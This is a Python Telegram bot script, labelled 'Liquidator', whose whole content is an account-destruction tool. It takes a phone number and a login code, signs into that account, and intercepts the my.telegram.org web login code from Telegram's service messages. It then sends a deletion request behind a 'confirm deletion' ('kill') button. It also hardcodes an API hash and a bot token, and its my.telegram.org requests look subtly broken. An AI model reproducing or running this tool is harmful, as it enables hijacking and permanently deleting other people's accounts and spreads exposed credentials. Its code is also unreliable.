import os, re, asyncio, aiohttp
from telethon import TelegramClient, events, Button
from bs4 import BeautifulSoup

# --- ТВОИ ДАННЫЕ (ПОЛНОСТЬЮ ЗАПОЛНЕНО) ---
API_ID = 27798369
API_HASH = '47e0988636b0d97036a2824368142719'
ADMIN_ID = 174415647
BOT_TOKEN = '8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU' 
# ---------------------------------------

bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
state = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if event.sender_id == ADMIN_ID:
        await event.respond("⚡️ **Ликвидатор готов.**\nПришли номер телефона (+7...)")

@bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id == ADMIN_ID))
async def manager(event):
    chat_id = event.chat_id
    text = event.text.strip()

    if text.startswith('+'):
        phone = text
        await event.respond(f"⏳ Подключаюсь к {phone}...")
        client = TelegramClient(f"u_{phone.replace('+', '')}", API_ID, API_HASH)
        await client.connect()
        
        try:
            sent = await client.send_code_request(phone)
            state[chat_id] = {'client': client, 'phone': phone, 'hash': sent.phone_code_hash}
            await event.respond("📩 **Код входа отправлен.**\nВведи его цифрами:")
        except Exception as e:
            await event.respond(f"❌ Ошибка: {e}")

    elif text.isdigit() and chat_id in state:
        data = state[chat_id]
        client = data['client']
        try:
            await client.sign_in(data['phone'], text, phone_code_hash=data['hash'])
            await event.respond("✅ **Вход выполнен!**\nЗапрашиваю код на удаление...")

            session = aiohttp.ClientSession()
            state[chat_id]['http_session'] = session

            async with session.post('https://my.telegram.org', data={'phone': data['phone']}) as r:
                res = await r.json()
                r_hash = res['random_hash']
                state[chat_id]['r_hash'] = r_hash

            @client.on(events.NewMessage(from_users=777000))
            async def catch_web(web_e):
                if "web login code" in web_e.raw_text.lower():
                    web_code = re.search(r'code:\s*([A-Za-z0-9]+)', web_e.raw_text).group(1)
                    await session.post('https://my.telegram.org', 
                                     data={'phone': data['phone'], 'random_hash': r_hash, 'password': web_code})
                    
                    async with session.get('https://my.telegram.org') as p:
                        soup = BeautifulSoup(await p.text(), 'html.parser')
                        f_hash = soup.find('input', {'name': 'hash'})['value']

                    btn = [Button.inline("💀 ПОДТВЕРДИТЬ УДАЛЕНИЕ", data=f"kill_{data['phone']}_{f_hash}")]
                    await bot.send_message(ADMIN_ID, f"⚠️ Аккаунт {data['phone']} готов к удалению.", buttons=btn)
        except Exception as e:
            await event.respond(f"❌ Ошибка: {e}")

@bot.on(events.CallbackQuery(pattern=r'kill_'))
async def final_kill(event):
    data_parts = event.data.decode().split('_')
    phone = data_parts[1]
    f_hash = data_parts[2]
    
    # Финальный запрос на удаление
    for sid, data in state.items():
        if data['phone'] == phone:
            session = data['http_session']
            await session.post('https://my.telegram.org/do_delete', data={'hash': f_hash, 'message': 'Goodbye'})
            await session.close()
            break
            
    await event.edit("🚀 **Аккаунт успешно ликвидирован!**")

print("Бот запущен...")
bot.run_until_disconnected()
